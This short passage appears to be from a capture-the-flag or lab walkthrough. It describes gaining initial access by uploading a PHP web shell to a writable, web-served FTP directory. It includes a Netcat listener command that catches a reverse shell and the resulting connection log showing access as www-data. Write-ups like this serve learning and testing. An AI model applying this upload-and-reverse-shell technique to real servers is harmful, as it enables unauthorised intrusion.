3. Uploading a Web Shell

The FTP directory was writable. This allowed a PHP web shell to be uploaded into the web-accessible FTP directory.
After uploading the shell, I started a Netcat listener on Kali:

nc -lvnp 4444 

I then accessed the uploaded shell through the web server.
A connection was received:
connect to [192.168.129.177] from (UNKNOWN) [10.49.189.85]

I checked the current user:
whoami
Output:
www-data
So I had obtained an initial shell as the low-privileged `www-data` user.

